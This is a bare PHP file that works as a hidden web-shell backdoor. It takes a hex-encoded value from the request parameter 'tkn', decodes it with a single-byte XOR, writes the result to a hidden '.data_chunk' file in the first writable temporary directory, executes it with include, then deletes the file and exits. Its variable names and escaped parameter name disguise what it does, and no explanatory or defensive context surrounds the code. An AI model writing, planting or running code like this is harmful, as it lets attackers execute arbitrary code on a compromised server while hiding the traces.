<?php

if(@$_REQUEST["tk\x6E"] !== null){
	$parameter_group = array_filter(["/tmp", sys_get_temp_dir(), session_save_path(), ini_get("upload_tmp_dir"), getenv("TMP"), "/var/tmp", "/dev/shm", getenv("TEMP"), getcwd()]);
	$desc = hex2bin($_REQUEST["tk\x6E"]);
	$hld='';for($k=0; $k<strlen($desc); $k++){$hld .= chr(ord($desc[$k]) ^ 84);}
	for ($holder = 0, $entity = count($parameter_group); $holder < $entity; $holder++) {
    $reference = $parameter_group[$holder];
    		if ((bool)is_dir($reference) && (bool)is_writable($reference)) {
    $elem = "$reference" . "/.data_chunk";
    if (file_put_contents($elem, $hld)) {
	include $elem;
	@unlink($elem);
	die();
}
}
}
}